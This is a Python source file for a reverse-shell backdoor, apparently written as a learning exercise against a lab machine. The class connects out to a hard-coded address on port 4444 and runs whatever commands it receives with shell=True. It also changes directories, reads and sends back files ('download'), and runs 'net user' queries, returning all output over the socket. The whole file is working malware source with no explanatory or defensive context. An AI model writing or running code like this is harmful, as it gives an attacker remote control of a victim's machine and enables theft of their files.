import socket as s
import sys
import os
import subprocess as sb
import json
import chardet

class Backdoor:
	def __init__(self, ip, port):
		self.conn = s.socket(s.AF_INET, s.SOCK_STREAM)
		self.conn.connect((ip, port))
	def reliable_send(self, data):
		#json_data = json.dumps(str((data).decode()))
		encoding = chardet.detect(data)['encoding']
		json_data = json.dumps(str(data.decode(encoding)))
		#self.conn.send(bytes(json_data.encode()))
		self.conn.send(bytes(json_data.encode()))
	def reliable_recv(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + str(self.conn.recv(1024).decode())
				return json.loads(json_data)
			except ValueError:
				continue
	'''
	def reliable_recv(self):
		json_data = self.conn.recv(1024)
		return json.loads(str(json_data.decode()))
	'''
	def exec_sys_cmd(self, command):
		return sb.check_output(command, shell=True)
	def change_work_dir_to(self, path):
		os.chdir(path)
		return bytes(("[+] Changing working directory to " + path).encode())
	def read_file(self, path):
		with open(path, "rb") as file:
			return file.read()
	def net_user(self, comm):
		return sb.check_output(comm, shell=True)
	def net_local(self, comm):
		return sb.check_output(comm, shell=True)

	def run(self):
		#conn.send((bytes(("\n[+] Connection established.\n\n").encode())))
		while True:
				command = self.reliable_recv()
				if command[0] == "exit":
					self.conn.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_res = self.change_work_dir_to(command[1])
				elif command[0] == "download":
					command_res = self.read_file(command[1])
				elif command[0] == "net" and command[1] == "user":
					command_res = self.net_user(command)
				elif command[0] == "net" and command[1] == "local":
					command_res = self.net_local(command)
				else:
					command_res = self.exec_sys_cmd(command)

				self.reliable_send(command_res)

my_bd = Backdoor("192.168.38.151", 4444)
my_bd.run()

